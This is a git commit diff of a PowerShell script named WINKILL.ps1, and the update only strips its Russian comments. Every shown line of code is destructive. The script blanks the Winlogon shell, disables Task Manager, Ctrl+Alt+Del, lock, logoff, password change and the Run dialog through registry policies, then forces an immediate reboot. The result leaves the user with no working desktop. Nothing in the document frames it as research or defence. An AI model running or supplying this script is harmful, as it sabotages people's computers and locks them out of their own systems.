d418a460d25de19c5ed62e3581c92be8d78c578e
KoTim <100821199+tim1363@users.noreply.github.com>
2025-05-16 12:22:50 +0300

    Update WINKILL.ps1

--- WINKILL.ps1
+++ WINKILL.ps1
@@ -1,15 +1,11 @@
-# Полностью пустой Shell — ничего не запустится после входа
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value ""
 
-# Отключение всего Ctrl + Alt + Del
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableTaskMgr -Value 1
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableChangePassword -Value 1
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableLockWorkstation -Value 1
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableLogoff -Value 1
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableCAD -Value 1
 
-# Блокировка Win + R (Выполнить)
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name NoRun -Value 1
 
-# Ребут
 shutdown /r /t 0
